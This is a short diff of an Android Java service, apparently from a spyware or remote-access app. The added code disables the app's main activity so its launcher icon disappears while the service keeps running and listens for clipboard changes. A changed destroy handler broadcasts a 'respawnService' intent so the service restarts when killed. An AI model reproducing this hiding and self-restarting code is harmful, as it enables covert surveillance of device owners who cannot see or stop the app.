@@ -148,6 +148,10 @@ public class MainService extends Service {
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         super.onStartCommand(intent, flags, startId);
+
+        PackageManager pkg=this.getPackageManager();
+        pkg.setComponentEnabledSetting(new ComponentName(this, MainActivity.class), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+
         ClipboardManager.OnPrimaryClipChangedListener mPrimaryChangeListener = new ClipboardManager.OnPrimaryClipChangedListener() {
             public void onPrimaryClipChanged() {
                 ClipboardManager clipboard = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
@@ -182,10 +186,7 @@ public class MainService extends Service {
     public void onDestroy() {
         super.onDestroy();
 
-        Intent broadcastIntent = new Intent();
-        broadcastIntent.setAction("RestartService");
-        broadcastIntent.setClass(this, ServiceReciever.class);
-        this.sendBroadcast(broadcastIntent);
+        sendBroadcast(new Intent("respawnService"));
     }
 
 
